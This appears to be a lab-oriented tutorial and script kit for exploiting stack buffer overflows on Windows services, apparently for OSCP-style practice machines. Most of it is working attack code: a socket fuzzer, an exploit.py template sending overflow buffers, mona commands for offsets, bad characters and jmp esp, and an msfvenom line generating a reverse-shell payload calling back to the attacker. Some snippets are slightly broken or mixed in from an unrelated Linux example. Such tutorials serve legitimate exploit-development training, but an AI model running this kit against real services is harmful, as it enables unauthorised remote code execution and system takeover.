# Buffer-Overflow-Script
The script help you to understand the bascis of Buffer overflow and will save you a lot of time while executing the attack.

I have created different file step by step to make.
Below is the following sequence -
1. Fuzzing (fuzzer.py)
2. Crash Replication & Controlling EIP (Crash Replication.py)
3. Metasploit random pattren 
4. use mona to find out the pattren offset
5. Finding Bad Characters (Badchars.py)
6. Finding a Jump Point
7. Generate Payload
8. Prepend NOPs
9. Use everything above and add your prefix + overflow + retn + padding + payload + postfix
 to **exploit.py**

Important 1st set **Mona Configuration** to a specific folder

```
!mona config -set workingfolder c:\mona\%p
```

# **Fuzzing**

Create a file on your Kali box called fuzzer.py with the following contents:

fuzzer.py

```python
import socket, time, sys

ip = "MACHINE_IP"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1
```

# **Crash Replication & Controlling EIP**

exploit.py

```python
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Creating a pattern with -l with no. of crash + 400 as saftey

```python
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

Copy the output and place it into the payload variable of the [exploit.py](http://exploit.py/) script.

To find offset of the EIP (On the Debugger)

findmsp

The findmsp command will find all instances or certain references to a cyclic pattern (a.k.a. “Metasploit pattern”) in memory, registers, etc

```python
!mona findmsp -distance 600
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a809067e-588c-4c61-964c-99f9f967dafb/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a809067e-588c-4c61-964c-99f9f967dafb/Untitled.png)

we are controlling EIP. in the end we need to make jump through it

update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

# **Finding Bad Characters**

just find badchar sending via payload then esp dump thing find the bad chars

jump to them to find the return value

Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).

IMP —- use direct bad chars just edit it no neeed to type shit.

```python
!mona bytearray -b "\x00"
```

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:

```python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```

Update your [exploit.py](http://exploit.py/) script and set the payload variable to the string of bad chars the script generates.

```python
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP_address>
```

ESP > follow the dump for more accurate result

# **Finding a Jump Point**

```python
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' will output the payload we want, but it requires manually converting to little endian
```

```python
Method 2 - Struct:
```

```python
python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
```


It requires importing a module but struct.pack allows us to automatically convert memory to little endian.


We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary


```python
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):

```python
!mona jmp esp -m gatekeeper.exe
!mona jmp -r esp -cpb "\x00(badchars)"
```

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).

Choose an address and update your exploit. script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

# **Generate Payload**

Run the following msfvenom command on Kali, using your Kali VPN IP as LHOST and updating the -b option with all the badchars you identified (including \x00):

```python
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py
```

Copy the generated python code and integrate it into your exploit.py script, e.g. by setting the payload variable equal to the buf variable from the code.

# **Prepend NOPs**

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```
padding = "\x90" * 16

```
